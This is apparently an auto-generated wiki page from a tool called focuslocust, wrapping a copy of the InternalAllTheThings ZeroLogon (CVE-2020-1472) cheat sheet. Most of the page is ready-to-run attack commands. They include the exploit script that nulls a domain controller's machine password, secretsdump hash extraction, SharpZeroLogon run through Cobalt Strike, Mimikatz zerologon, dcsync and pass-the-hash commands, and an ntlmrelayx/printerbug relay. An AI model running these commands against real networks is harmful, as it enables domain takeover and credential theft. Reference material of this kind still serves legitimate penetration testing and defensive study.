---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# ZeroLogon

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-cve-zerologon` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/ZeroLogon.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ZeroLogon](../../topics/active-directory/zerologon.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-cve-zerologon |
| name | ZeroLogon |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/CVE/ZeroLogon.md |

## Preserved Source Material

````yaml
_body: "# ZeroLogon\n\n> CVE-2020-1472\n\n**Exploitation**:\n\n1. Spoofing the client credential\n2. Disabling signing and\
  \ sealing\n3. Spoofing a call\n4. Changing a computer's AD password to null\n5. From password change to domain admin\n6.\
  \ :warning: reset the computer's AD password in a proper way to avoid any Deny of Service\n\n**Tools**:\n\n* `cve-2020-1472-exploit.py`\
  \ - Python script from [dirkjanm](https://github.com/dirkjanm)\n\n```powershell\n# Check (https://github.com/SecuraBV/CVE-2020-1472)\n\
  proxychains python3 zerologon_tester.py DC01 172.16.1.5\n\n$ git clone https://github.com/dirkjanm/CVE-2020-1472.git\n\n\
  # Activate a virtual env to install impacket\n$ python3 -m venv venv\n$ source venv/bin/activate\n$ pip3 install .\n\n#\
  \ Exploit the CVE (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)\nproxychains python3\
  \ cve-2020-1472-exploit.py DC01 172.16.1.5\n\n# Find the old NT hash of the DC\nproxychains secretsdump.py -history -just-dc-user\
  \ 'DC01$' -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'CORP/DC01$@DC01.CORP.LOCAL'\n\n# Restore password from secretsdump\
  \ \n# secretsdump will automatically dump the plaintext machine password (hex encoded) \n# when dumping the local registry\
  \ secrets on the newest version\npython restorepassword.py CORP/DC01@DC01.CORP.LOCAL -target-ip 172.16.1.5 -hexpass e6ad4c4f64e71cf8c8020aa44bbd70ee711b8dce2adecd7e0d7fd1d76d70a848c987450c5be97b230bd144f3c3\n\
  deactivate\n```\n\n* `nccfsas` - .NET binary for Cobalt Strike's execute-assembly\n\n```powershell\ngit clone https://github.com/nccgroup/nccfsas\n\
  # Check\nexecute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local\n\n# Resetting the machine account password\nexecute-assembly\
  \ SharpZeroLogon.exe win-dc01.vulncorp.local -reset\n\n# Testing from a non Domain-joined machine\nexecute-assembly SharpZeroLogon.exe\
  \ win-dc01.vulncorp.local -patch\n\n# Now reset the password back\n```\n\n* `Mimikatz` - 2.2.0 20200917 Post-Zerologon\n\
  \n```powershell\nprivilege::debug\n# Check for the CVE\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$\n\n# Exploit\
  \ the CVE and set the computer account's password to \"\"\nlsadump::zerologon /target:DC01.LAB.LOCAL /account:DC01$ /exploit\n\
  \n# Execute dcsync to extract some hashes\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:krbtgt /authuser:DC01$\
  \ /authdomain:LAB /authpassword:\"\" /authntlm\nlsadump::dcsync /domain:LAB.LOCAL /dc:DC01.LAB.LOCAL /user:Administrator\
  \ /authuser:DC01$ /authdomain:LAB /authpassword:\"\" /authntlm\n\n# Pass The Hash with the extracted Domain Admin hash\n\
  sekurlsa::pth /user:Administrator /domain:LAB /rc4:HASH_NTLM_ADMIN\n\n# Use IP address instead of FQDN to force NTLM with\
  \ Windows APIs \n# Reset password to Waza1234/Waza1234/Waza1234/\n# https://github.com/gentilkiwi/mimikatz/blob/6191b5a8ea40bbd856942cbc1e48a86c3c505dd3/mimikatz/modules/kuhl_m_lsadump.c#L2584\n\
  lsadump::postzerologon /target:10.10.10.10 /account:DC01$\n```\n\n* `netexec` - only check\n\n```powershell\nnetexec smb\
  \ 10.10.10.10 -u username -p password -d domain -M zerologon\n```\n  \nA 2nd approach to exploit zerologon is done by relaying\
  \ authentication.\n\nThis technique, [found by dirkjanm](https://dirkjanm.io/a-different-way-of-abusing-zerologon), requires\
  \ more prerequisites but has the advantage of having no impact on service continuity.\nThe following prerequisites are needed:\n\
  \n* A domain account\n* One DC running the `PrintSpooler` service\n* Another DC vulnerable to zerologon\n\n* `ntlmrelayx`\
  \ - from Impacket and any tool such as [`printerbug.py`](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)\n\
  \n```powershell\n# Check if one DC is running the PrintSpooler service\nrpcdump.py 10.10.10.10 | grep -A 6 \"spoolsv\"\n\
  \n# Setup ntlmrelay in one shell\nntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support\n\n#Trigger printerbug in 2nd shell\n\
  python3 printerbug.py 'LAB.LOCAL'/joe:Password123@10.10.10.10 10.10.10.12\n```\n\n## References\n\n* [Zerologon:Unauthenticated\
  \ domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort - September 15, 2020](https://web.archive.org/web/20200915011856/https://www.secura.com/pathtoimg.php?id=2055)"
_relative_path: active-directory/CVE/ZeroLogon.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/CVE/ZeroLogon.md
````
